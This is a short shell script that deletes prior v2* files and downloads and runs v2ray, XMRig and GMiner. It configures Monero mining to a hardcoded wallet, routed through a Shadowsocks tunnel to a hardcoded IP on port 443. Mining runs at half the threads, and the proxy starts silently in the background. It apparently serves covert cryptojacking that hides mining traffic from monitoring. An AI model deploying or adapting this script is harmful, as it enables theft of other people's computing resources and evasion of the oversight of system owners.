#!/bin/sh

apt update
apt install unzip
cd ~/
rm -rf v2*
mkdir v2ray
wget https://github.com/v2fly/v2ray-core/releases/latest/download/v2ray-linux-64.zip
unzip v2ray-linux-64.zip -d v2ray
cd v2ray
chmod +x v2ray
cat > ~/v2ray/config.json<<EOL

{
"inbounds": [
{
"port": 1080,
"listen": "127.0.0.1",
"protocol": "socks",
"settings": {
"auth": "noauth",
"udp": true
}
}
],
"outbounds": [
{
"protocol": "shadowsocks",
"settings": {
"servers": [
{
"address": "3.81.227.209",
"port": 443,
"method": "chacha20-ietf-poly1305",
"password": "abc123",
"udp": true
}
]
}
}
]
}

EOL


cd ~/
wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
tar zxfv xmrig-6.22.2-linux-static-x64.tar.gz
cd ~/xmrig-6.22.2
cat > config.json<<EOL
{
    "autosave": true,
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": true,
        "priority": 1,
        "yield": false,
        "max-threads-hint": 50,
        "asm": true,
        "argon2-impl": "auto",
        "rx-threads": true,
        "rx-cache-qos": true
    },
    "opencl": false,
    "cuda": false,
  "pools": [
        {
            "algo": "rx/0",
            "coin": null,
            "url": "3.81.227.209:3333",
            "user": "43cx2hYimLw9YkAYxLG8Vg2TStTL3r6XmbfDfBiCY9MCViYCCaYpEzr1BUCmZTquQwLpg7Sb1FhrV4qR5EXWwvkgKdSHVLd",
            "pass": "z",
            "rig-id": null,
            "nicehash": true,
            "keepalive": false,
            "enabled": true,
            "tls": false,
            "sni": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": "127.0.0.1:1080",
            "self-select": null,
            "submit-to-origin": false
       }
    ]
}
EOL

mkdir ~/ggu
cd ~/ggu
wget https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_linux64.tar.xz
tar -xvf gminer_3_44_linux64.tar.xz
cd ~/v2ray
nohup ./v2ray run >/dev/null 2>&1 &
cd ~/xmrig-6.22.2
./xmrig 
